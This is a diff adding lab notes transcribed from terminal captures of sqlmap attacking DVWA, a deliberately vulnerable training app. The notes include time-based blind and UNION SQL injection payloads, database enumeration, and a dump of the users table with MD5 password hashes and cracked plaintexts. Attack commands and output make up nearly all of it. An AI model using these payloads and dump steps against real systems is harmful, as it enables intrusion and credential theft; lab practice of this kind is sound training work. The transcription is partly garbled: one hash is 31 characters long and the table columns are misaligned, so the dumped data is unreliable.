@@ -1,0 +1,52 @@
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=low" \
+  --batch --dbs | tee low.txt
+
+NOTE: Transcribed from terminal captures taken at the time. The raw file is
+low.txt in the original lab folder.
+
+Type:  time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: id=1' AND (SELECT 1271 FROM (SELECT(!SLEEP(5)))AAgw)-- YiJo&Submit=Submit
+
+Type:  UNION query
+Title: MySQL UNION query (NULL) - 2 columns
+Payload: id=1' UNION ALL SELECT CONCAT(0x7178627071,0x656f6346674c67425077556877475773565458486c7a78697a4d6d644d4c537644467a73424e4a6b,0x7178766a71),NULL#&Submit=Submit
+
+---
+[01:53:23] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+[01:53:23] [INFO] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+(Two more techniques -- boolean-based blind and error-based -- were also
+reported earlier in the same run but scrolled off the captured screen.)
+
+---------------------------------------------------------------------------
+
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=low" \
+  --batch -D dvwa --tables | tee -a low.txt
+
+$ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=cg4occ5ghssjddocj64ggoff24; security=low" \
+  --batch -D dvwa -T users --dump | tee -a low.txt
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+---------------------------+------------+------------+----------------------------------+--------------+
+| user_id | user    | avatar                    | first_name | last_name  | password                           | last_login / failed_login |
++---------+---------+---------------------------+------------+------------+----------------------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg | admin      | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | 0 |
+| 2       | gordonb | /hackable/users/gordonb.jpg | Gordon   | Brown      | e99a18c428cb38d5f260853678920ec3 (abc123)   | 0 |
+| 3       | 1337    | /hackable/users/1337.jpg | Hack       | Charley    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | 0 |
+| 4       | pablo   | /hackable/users/pablo.jpg | Pablo      | Picasso    | 0d107d09f5bbe40cade3de5c71e9eb7  (letmein)  | 0 |
+| 5       | smithy  | /hackable/users/smithy.jpg | Bob       | Smith      | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | 0 |
++---------+---------+---------------------------+------------+------------+----------------------------------+--------------+
+
+[INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/users.csv'
